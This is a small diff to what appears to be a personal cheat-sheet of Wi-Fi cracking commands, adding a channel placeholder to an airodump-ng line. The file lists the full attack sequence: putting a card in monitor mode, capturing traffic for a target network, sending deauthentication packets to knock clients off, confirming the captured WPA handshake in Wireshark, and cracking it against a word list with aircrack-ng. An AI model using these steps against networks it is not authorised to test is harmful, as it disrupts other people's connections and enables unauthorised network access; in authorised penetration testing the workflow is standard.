@@ -2,7 +2,7 @@ lsusb
 ifconfig iwconfig
 airmon-ng start wlan0
 airodump-ng wlan0
-airodump-ng -c[ ] -w [file name] -d [mac address] wlan0
+airodump-ng -c[ channel ] -w [file name] -d [mac address] wlan0
 aireplay-ng --deauth [times] -a [wifi address] -e [client] wlan0
 wireshark [.cap file] to check eapol
 aircrack-ng [.cap file] -w [word list]
